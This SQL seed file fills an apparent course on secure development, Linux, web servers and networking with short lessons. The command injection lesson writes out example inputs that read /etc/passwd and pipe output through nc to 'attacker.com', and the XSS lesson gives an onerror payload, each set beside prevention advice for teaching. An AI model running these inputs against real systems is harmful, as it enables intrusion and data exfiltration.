INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe', 'What is the SDL?', 1, 'The Security Development Lifecycle (SDL) integrates security into every phase of software development.

Key Phases:
1. Training - Security awareness for all team members
2. Requirements - Define security requirements and compliance goals
3. Design - Threat modeling and attack surface analysis
4. Implementation - Use approved tools, review code
5. Verification - Dynamic analysis, fuzz testing, security testing
6. Release - Final security review, incident response plan
7. Response - Security incident response process

Why SDL Matters:
- Reduces vulnerability density by up to 50%
- Lowers cost of fixing security bugs
- Builds customer trust and regulatory compliance' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'What is the SDL?');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe', 'Threat Modeling with STRIDE', 2, 'STRIDE is a mnemonic developed by Microsoft for identifying security threats.

Categories:
- Spoofing - Impersonating something or someone
- Tampering - Modifying data without authorization
- Repudiation - Denying actions without proof
- Information Disclosure - Exposing data to unauthorized parties
- Denial of Service - Making service unavailable
- Elevation of Privilege - Gaining unauthorized access levels

Process:
1. Create a data flow diagram (DFD)
2. Identify trust boundaries
3. Apply STRIDE to each component
4. Rate threats using DREAD or CVSS
5. Define mitigations for high-risk threats' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'Threat Modeling with STRIDE');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe', 'Secure Design Principles', 3, 'Core Principles:
1. Least Privilege - Grant minimum permissions needed
2. Defense in Depth - Multiple layers of security controls
3. Fail Secure - Default to deny on failure
4. Separation of Duties - No single person controls all steps
5. Keep It Simple - Complexity is the enemy of security
6. Zero Trust - Never trust, always verify

Architecture Patterns:
- Input validation at all boundaries
- Parameterized queries to prevent injection
- Output encoding to prevent XSS
- Encryption at rest and in transit
- Secure session management' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'Secure Design Principles');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'fbbf55ce-ef86-4270-9284-a84ff143a7a2', 'SQL Injection Beyond Basics', 1, 'Union-Based Injection:
Use UNION SELECT to combine results from injected queries.

Blind SQL Injection:
- Boolean-based: Compare responses to true/false conditions
- Time-based: Use SLEEP() or WAITFOR DELAY to infer data

Second-Order Injection:
Malicious input is stored and triggered by a different query later.

Prevention:
- Parameterized queries (always)
- Stored procedures
- Input validation (allowlist)
- WAF rules as defense in depth' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'SQL Injection Beyond Basics');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'fbbf55ce-ef86-4270-9284-a84ff143a7a2', 'OS Command Injection', 2, 'An attacker executes arbitrary OS commands through vulnerable application input fields.

Common Injection Points:
- ping/traceroute utilities
- File upload processing
- PDF generators with shell commands

Techniques:
- Direct injection: ; cat /etc/passwd
- Pipe injection: ls | nc attacker.com 4444
- Backtick injection
- Variable expansion: ${IFS} to bypass spaces

Prevention:
- Avoid shell execution entirely
- Input validation (strict allowlist)
- Sandboxing and containerization' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'OS Command Injection');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'fbbf55ce-ef86-4270-9284-a84ff143a7a2', 'LDAP and XML Injection', 3, 'LDAP Injection:
Manipulates LDAP queries through user input to bypass authentication.

Prevention:
- Escape special LDAP characters
- Use parameterized LDAP queries
- Validate and sanitize all input

XML Injection / XXE:
External Entity Injection allows reading local files, SSRF, and DoS.

Prevention:
- Disable external entities in XML parsers
- Use JSON instead of XML where possible
- Use updated parser libraries' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'LDAP and XML Injection');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '0ec03831-91f5-448f-b90b-d4d327a12a4c', 'XSS Exploitation Techniques', 1, 'Types:
1. Reflected XSS - Payload in URL, reflected in response
2. Stored XSS - Payload stored in database, served to all users
3. DOM-based XSS - Client-side JavaScript processes unsanitized input

Advanced Techniques:
- Filter bypass: <img src=x onerror=alert(1)>
- Encoding tricks and mutation XSS
- Event handlers: onload, onerror, onfocus

Impact:
- Session hijacking via cookie theft
- Keylogging and form capture

Defense:
- Content Security Policy (CSP) headers
- Output encoding (context-dependent)
- HttpOnly cookies' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'XSS Exploitation Techniques');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '0ec03831-91f5-448f-b90b-d4d327a12a4c', 'JWT Security Pitfalls', 2, 'Common Vulnerabilities:
1. None algorithm attack - Setting alg to none
2. Weak signing keys - Brute-forceable HMAC secrets
3. Algorithm confusion - Using RS256 key as HMAC secret
4. Missing expiration - Tokens valid forever
5. Insecure storage - Storing in localStorage (XSS risk)

Best Practices:
- Always validate the algorithm server-side
- Use strong, random signing keys (256+ bits)
- Set short expiration times
- Store tokens in HttpOnly, Secure cookies
- Validate all claims (iss, aud, exp, nbf)' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'JWT Security Pitfalls');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '0ec03831-91f5-448f-b90b-d4d327a12a4c', 'Session Management Attacks', 3, 'Session Hijacking:
- Token prediction - Predictable session IDs
- Session fixation - Attacker sets victim session ID
- Sidejacking - Sniffing session tokens from network

Defense:
- Regenerate session ID after login
- Use cryptographically random session IDs
- Bind sessions to IP/User-Agent
- Implement absolute and idle timeouts
- Secure cookie flags: Secure, HttpOnly, SameSite
- CSRF tokens for state-changing operations' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'Session Management Attacks');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '5865ab36-6c51-478c-b2da-4815cbc69447', 'IDOR and Access Control Bypass', 1, 'Insecure Direct Object References (IDOR):
Accessing resources by manipulating object identifiers in API requests.

Types:
- Horizontal IDOR - Access another user at same privilege level
- Vertical IDOR - Access admin resources as regular user

Prevention:
- Use indirect references (UUIDs, slugs)
- Server-side authorization on every request
- Access control middleware
- Log and monitor access patterns' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'IDOR and Access Control Bypass');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '5865ab36-6c51-478c-b2da-4815cbc69447', 'Race Conditions and TOCTOU', 2, 'Time-of-Check to Time-of-Use (TOCTOU):
A vulnerability where the system checks a condition but the state changes before use.

Examples:
- Double-spending in payment systems
- Coupon redemption race conditions
- Privilege escalation during state changes

Prevention:
- Database-level locking (SELECT FOR UPDATE)
- Atomic operations
- Idempotency keys
- Queue-based processing' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'Race Conditions and TOCTOU');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '5865ab36-6c51-478c-b2da-4815cbc69447', 'Server-Side Request Forgery', 3, 'SSRF: An attacker makes the server send requests to internal resources.

Attack Targets:
- Cloud metadata endpoints (AWS, GCP, Azure)
- Internal services not exposed to internet
- Database servers via admin interfaces

Techniques:
- Bypass URL parsers with encoded characters
- Use DNS rebinding to reach internal IPs
- Redirect chains to bypass filters

Prevention:
- URL validation (allowlist)
- Block private/internal IP ranges
- Network segmentation' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'Server-Side Request Forgery');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '5ee952ac-4c88-4540-8a95-6793bcbd3c1d', 'Linux Boot Process', 1, 'Stages:
1. BIOS/UEFI - Hardware initialization, POST
2. Bootloader - GRUB loads kernel
3. Kernel - Initializes hardware, mounts root filesystem
4. Init/Systemd - Starts services and daemons
5. Login - Presents login prompt

Key Commands:
- dmesg - View kernel messages
- systemctl - Manage systemd services
- journalctl - View system logs
- uptime - System uptime and load
- free -h - Memory usage' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'Linux Boot Process');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '5ee952ac-4c88-4540-8a95-6793bcbd3c1d', 'File System Navigation', 2, 'Directory Structure:
/ Root, /bin Binaries, /etc Config, /home Users, /var Data, /tmp Temp, /proc Process info

Navigation Commands:
- pwd - Print working directory
- cd /path - Change directory
- ls -la - List files with details
- find / -name *.conf - Find files
- tree -L 2 - Directory tree view

File Types: -, d, l, c, b' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'File System Navigation');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '5ee952ac-4c88-4540-8a95-6793bcbd3c1d', 'Essential Command Line Tools', 3, 'File Operations:
- cp, mv, rm, mkdir, touch, ln

Text Processing:
- cat, less, head, tail, grep, sed, awk, wc, sort, uniq

Piping and Redirection:
- cmd1 | cmd2 (pipe)
- cmd > file (redirect stdout)
- cmd >> file (append)
- cmd 2>&1 (redirect stderr)' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'Essential Command Line Tools');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '76de84fc-6334-41b4-8149-55a05ea95912', 'User and Group Management', 1, 'Commands:
- useradd -m -s /bin/bash username
- passwd username
- usermod -aG groupname username
- userdel -r username
- id username

Key Files:
- /etc/passwd - User accounts
- /etc/shadow - Password hashes
- /etc/group - Group definitions

UID Ranges:
- 0 = Root
- 1-999 = System accounts
- 1000+ = Regular users' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'User and Group Management');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '76de84fc-6334-41b4-8149-55a05ea95912', 'File Permissions Deep Dive', 2, 'Permission Types:
- r (read) = 4
- w (write) = 2
- x (execute) = 1
- Example: 755 = rwxr-xr-x

Special Permissions:
- SUID (4000) - Run as file owner
- SGID (2000) - Run as file group
- Sticky Bit (1000) - Only owner can delete

Commands:
- chmod, chown, umask' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'File Permissions Deep Dive');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '76de84fc-6334-41b4-8149-55a05ea95912', 'sudo and Privilege Escalation', 3, 'sudo Configuration:
Edit /etc/sudoers with visudo

Privilege Escalation Vectors:
- Misconfigured sudo rules
- SUID binaries
- Kernel exploits
- Cron jobs with weak permissions
- PATH manipulation

Hardening:
- Least privilege principle
- Audit sudoers regularly
- Log all sudo commands' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'sudo and Privilege Escalation');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'c6827943-9077-4b7f-94bd-e1a5b8d5305c', 'Bash Scripting Fundamentals', 1, 'Script Structure:
#!/bin/bash

Variables, Conditionals, Loops

Exit Codes:
- 0 = Success
- set -e = Exit on error
- set -u = Error on undefined variable
- set -o pipefail = Catch pipe errors' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Bash Scripting Fundamentals');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'c6827943-9077-4b7f-94bd-e1a5b8d5305c', 'Text Processing with sed and awk', 2, 'sed (Stream Editor):
- Substitution, deletion, insert/append
- In-place editing with -i flag

awk:
- Print columns, custom delimiters
- Pattern filtering, line numbers
- Built-in variables: NR, NF, $0' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Text Processing with sed and awk');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'c6827943-9077-4b7f-94bd-e1a5b8d5305c', 'Regular Expressions', 3, 'Basic Regex:
. any char, * zero or more, + one or more
^ start, $ end, [] character class

Character Classes:
[0-9] digits, [a-z] lowercase, [A-Z] uppercase

Practical Examples:
- Email validation
- IP address matching
- Date format matching' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Regular Expressions');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '9e518831-5103-4e4a-9944-6deefdc7465f', 'Nginx Architecture and Configuration', 1, 'Architecture:
- Master process, Worker processes
- Event-driven, non-blocking I/O

Configuration:
- worker_processes, events, http blocks
- server blocks for virtual hosts
- location blocks for URL routing

Key Directives:
listen, server_name, location, proxy_pass, upstream' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'Nginx Architecture and Configuration');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '9e518831-5103-4e4a-9944-6deefdc7465f', 'Reverse Proxy and Load Balancing', 2, 'Reverse Proxy:
- proxy_pass to backend servers
- Set proxy headers
- WebSocket support

Load Balancing:
- Round-robin (default)
- Least connections
- IP hash for session affinity
- Weighted distribution' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'Reverse Proxy and Load Balancing');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '9e518831-5103-4e4a-9944-6deefdc7465f', 'SSL/TLS Configuration', 3, 'SSL Setup:
- ssl_certificate and ssl_certificate_key
- Modern TLS: TLSv1.2, TLSv1.3
- OCSP Stapling
- HSTS header

Security Headers:
- X-Frame-Options DENY
- X-Content-Type-Options nosniff
- Content-Security-Policy

Let''s Encrypt:
certbot --nginx -d example.com' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'SSL/TLS Configuration');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '70027b0b-5833-4a93-80a1-b6ef042bfcc7', 'Apache Configuration Basics', 1, 'Virtual Hosts:
<VirtualHost *:80> block configuration

Modules:
- a2enmod / a2dismod
- a2ensite / a2dissite

Apache vs Nginx:
- Apache: Process/thread model, .htaccess
- Nginx: Event-driven, static files, lower memory' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Apache Configuration Basics');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '70027b0b-5833-4a93-80a1-b6ef042bfcc7', 'Security Hardening', 2, 'ServerTokens Prod
ServerSignature Off

Disable Unnecessary Modules

Access Control:
- IP-based: Require ip
- Authentication: AuthType Basic

Security Headers:
X-Content-Type-Options, X-Frame-Options, HSTS' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Security Hardening');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '70027b0b-5833-4a93-80a1-b6ef042bfcc7', 'Performance Tuning', 3, 'MPM Configuration:
- Event MPM (recommended)
- Tune StartServers, MaxRequestWorkers

Caching:
- mod_expires for browser caching

Compression:
- mod_deflate for gzip

Monitoring:
- apachectl status
- ab for benchmarking' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Performance Tuning');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52', 'Deploying Node.js Applications', 1, 'Process Management with PM2:
- pm2 start, startup, save
- Cluster mode

Nginx + PM2:
- Reverse proxy to localhost
- WebSocket headers

Deployment Checklist:
- Environment variables
- SSL certificate
- PM2 auto-restart
- Log rotation' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Deploying Node.js Applications');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52', 'Containerized Deployment', 2, 'Dockerfile Best Practices:
- Multi-stage builds
- alpine base images
- npm ci --production

Docker Compose Production:
- restart: always
- Resource limits
- Health checks

CI/CD Pipeline:
- Build, test, deploy, health check' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Containerized Deployment');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52', 'Zero-Downtime Deployments', 3, 'Blue-Green Deployment:
1. Deploy to inactive env
2. Smoke test
3. Switch traffic

Rolling Updates:
- Gradually shift traffic
- Monitor error rates

Database Migrations:
- Backward-compatible only
- Feature flags' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Zero-Downtime Deployments');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf', 'OSI Model and TCP/IP', 1, '7-Layer OSI Model:
1. Application - HTTP, DNS, SMTP
2. Presentation - SSL/TLS
3. Session - RPC
4. Transport - TCP, UDP
5. Network - IP, ICMP
6. Data Link - Ethernet, ARP
7. Physical - Cables

TCP Three-Way Handshake:
SYN, SYN-ACK, ACK

Common Ports: 22, 80, 443, 3306, 5432, 6379' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'OSI Model and TCP/IP');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf', 'Subnetting and CIDR', 2, 'CIDR Notation:
/24 = 256 hosts, /25 = 128, /26 = 64

Private IP Ranges:
10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

Formula:
Usable IPs = 2^(32-mask) - 2' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'Subnetting and CIDR');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf', 'DNS and Name Resolution', 3, 'Record Types:
A, AAAA, CNAME, MX, TXT, NS, SOA

Resolution Process:
Browser cache > OS > Router > ISP > Root > TLD > Authoritative

Tools:
dig, nslookup, host' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'DNS and Name Resolution');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '16b83718-c1c5-4e49-b36c-27f6494ba6ea', 'Firewall Types and Configuration', 1, 'Types:
- Packet filtering (stateless)
- Stateful inspection
- Application layer (WAF)
- Next-gen (NGFW)

iptables:
- Default policies: INPUT DROP
- Allow established connections
- Rate limiting

nftables (modern replacement)' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'Firewall Types and Configuration');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '16b83718-c1c5-4e49-b36c-27f6494ba6ea', 'VPN Technologies', 2, 'Types: Site-to-Site, Remote Access

WireGuard (Modern):
- Simple config, ChaCha20 encryption

OpenVPN:
- Certificate-based auth
- TCP or UDP

Security:
- Strong encryption, PFS, key rotation' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'VPN Technologies');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '16b83718-c1c5-4e49-b36c-27f6494ba6ea', 'Network Address Translation', 3, 'Types:
- Static NAT (one-to-one)
- Dynamic NAT (pool)
- PAT (many-to-one)

iptables NAT:
- MASQUERADE for internet
- DNAT for port forwarding
- Enable IP forwarding' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'Network Address Translation');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'c5f841ba-1cbc-4bc1-b796-fb446a705264', 'Intrusion Detection Systems', 1, 'Types:
- NIDS (network), HIDS (host)
- NIPS (network prevention)

Tools:
- Snort, Suricata

Rule Types:
- Signature-based
- Anomaly-based
- Stateful protocol analysis' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Intrusion Detection Systems');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'c5f841ba-1cbc-4bc1-b796-fb446a705264', 'Log Management and SIEM', 2, 'Centralized Logging:
- rsyslog for remote collection

ELK Stack:
- Elasticsearch, Logstash, Kibana

Key Log Sources:
- Auth, firewall, web, app, system logs

Alerting:
- Failed logins, C2 connections, data exfil' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Log Management and SIEM');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'c5f841ba-1cbc-4bc1-b796-fb446a705264', 'Network Traffic Analysis', 3, 'Wireshark:
- Capture/display filters
- Follow TCP streams

 tcpdump:
- Packet capture
- Protocol filters

Attack Signatures:
- Beaconing, DNS tunneling, port scanning' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Network Traffic Analysis');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b', 'Network Troubleshooting Methodology', 1, 'CompTIA Process:
1. Identify the problem
2. Theory of cause
3. Test the theory
4. Plan and implement
5. Verify and document

Quick Commands:
ping, traceroute, mtr, dig, nslookup, ip addr show, ss -tulnp' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Network Troubleshooting Methodology');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b', 'Packet Analysis and Forensics', 2, 'Wireshark Investigation:
- Follow TCP streams
- IO graphs
- Protocol filters

Indicators of Compromise:
- Unusual DNS queries
- HTTP User-Agent anomalies
- TLS certificate mismatches' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Packet Analysis and Forensics');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b', 'Performance Monitoring Tools', 3, 'System: top, htop, glances, nmon
Network: iftop, nethogs, nload
Connections: ss, netstat, lsof
Bandwidth: iperf3, speedtest-cli
Disk: iostat, iotop, df -h' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Performance Monitoring Tools');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '9854d730-e12f-4d09-a17a-b1f94a2b7c7d', 'Kernel Architecture', 1, 'Kernel Types:
- Monolithic (Linux)
- Microkernel (QNX)
- Hybrid (Windows NT)

Components:
Scheduler, Memory Manager, VFS, Network Stack, Drivers

Modules:
lsmod, modinfo, modprobe, rmmod' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Kernel Architecture');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '9854d730-e12f-4d09-a17a-b1f94a2b7c7d', 'Process Management', 2, 'Process States:
R Running, S Sleeping, D Disk sleep, T Stopped, Z Zombie

Commands:
ps aux, top, kill, killall, nice/renice

Signals:
SIGTERM (15), SIGKILL (9), SIGHUP (1)' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Process Management');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), '9854d730-e12f-4d09-a17a-b1f94a2b7c7d', 'Memory Management', 3, 'Virtual Memory:
Per-process address space, page tables, TLB

Commands:
free -h, /proc/meminfo, vmstat

Swap:
Swap files, swappiness, OOM Killer

Page Cache:
File data in memory, dirty pages, sync' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Memory Management');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'cd761025-bbfb-4135-bcf2-5be718c5cc31', 'Performance Profiling', 1, 'Tools:
- perf (CPU profiling)
- strace (system calls)
- ltrace (library calls)
- Flame graphs

Common Bottlenecks:
- CPU: high %usr
- I/O: high %wa
- Memory: page faults
- Network: packet drops' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Performance Profiling');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'cd761025-bbfb-4135-bcf2-5be718c5cc31', 'Kernel Tuning Parameters', 2, 'sysctl:
- View: sysctl -a
- Set: sysctl -w param=value

Network Tuning:
tcp_fin_timeout, somaxconn, buffer sizes

File System:
fs.file-max, inotify.max_user_watches' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Kernel Tuning Parameters');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'cd761025-bbfb-4135-bcf2-5be718c5cc31', 'Resource Limits and cgroups', 3, 'ulimit:
- ulimit -a to view
- /etc/security/limits.conf

cgroups v2:
- Memory and CPU limits
- Process assignment

Docker:
- cpus and memory limits
- systemd-cgtop' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Resource Limits and cgroups');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372', 'Docker Fundamentals', 1, 'Concepts:
Image, Container, Dockerfile, Registry

Best Practices:
- alpine base, npm ci --production
- USER node directive

Commands:
build, run, ps, logs, exec, stop, rm, rmi' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Docker Fundamentals');
INSERT INTO "Lesson" (id, "sectionId", title, "order", content) SELECT gen_random_uuid(), 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372', 'Image Building and Optimization', 2, 'Multi-stage Builds:
- Builder stage for compilation
- Production stage with runtime only

Layer Optimization:
- Combine RUN, order by change freq

Security:
- Non-root, scan, specific tags' WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Image Building and Optimization');
